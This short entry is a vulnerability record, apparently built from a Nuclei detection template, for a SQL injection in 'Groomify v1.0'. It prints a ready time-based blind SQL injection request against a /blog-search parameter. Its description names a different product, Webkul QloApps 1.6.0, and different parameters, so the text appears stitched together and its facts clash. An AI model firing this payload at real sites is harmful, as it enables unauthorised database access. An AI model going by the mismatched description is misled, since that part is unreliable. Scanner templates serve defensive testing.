# Vulnerability: Groomify v1.0 - SQL Injection Vulnerability
**Classification:** CWE-89
**Source:** Nuclei Template (`groomify-sqli.yaml`)

## Description
An unauthenticated Time-Based SQL injection found in Webkul QloApps 1.6.0 via GET parameter date_from, date_to, and id_product allows a remote attacker to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 25s
GET /blog-search?search=deneme%27%20AND%20(SELECT%201642%20FROM%20(SELECT(SLEEP(6)))Xppf)%20AND%20%27rszk%27=%27rszk HTTP/1.1
Host: {{Hostname}}
```

